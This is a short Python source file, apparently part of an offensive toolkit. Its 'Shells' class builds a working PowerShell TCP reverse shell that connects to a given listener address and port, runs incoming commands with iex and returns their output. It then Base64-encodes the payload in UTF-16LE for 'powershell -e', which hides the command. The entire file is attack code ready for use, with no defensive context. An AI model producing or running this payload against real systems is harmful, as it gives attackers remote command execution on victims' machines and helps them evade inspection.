import base64

class Shells:
    @staticmethod
    def build_payload(listen_address: str, listen_port: str) -> str:
        """
        Build the raw PowerShell payload string for a TCP reverse shell.
        """
        return (
            f'$client = New-Object System.Net.Sockets.TCPClient("{listen_address}",{listen_port});'
            '$stream = $client.GetStream();'
            '[byte[]]$bytes = 0..65535|%{0};'
            'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;'
            '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
            '$sendback = (iex $data 2>&1 | Out-String );'
            '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";'
            '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
            '$stream.Write($sendbyte,0,$sendbyte.Length);'
            '$stream.Flush()};'
            '$client.Close()'
        )

    @staticmethod
    def encode_payload(payload: str) -> str:
        """
        Encode a given payload in UTF-16LE Base64 for use with `powershell -e`.
        """
        return base64.b64encode(payload.encode("utf-16le")).decode()

    @classmethod
    def encode_ps_for_e(cls, listen_address: str, listen_port: str) -> str:
        """
        Generate and encode the PowerShell payload in one call.
        """
        payload = cls.build_payload(listen_address, listen_port)
        return cls.encode_payload(payload)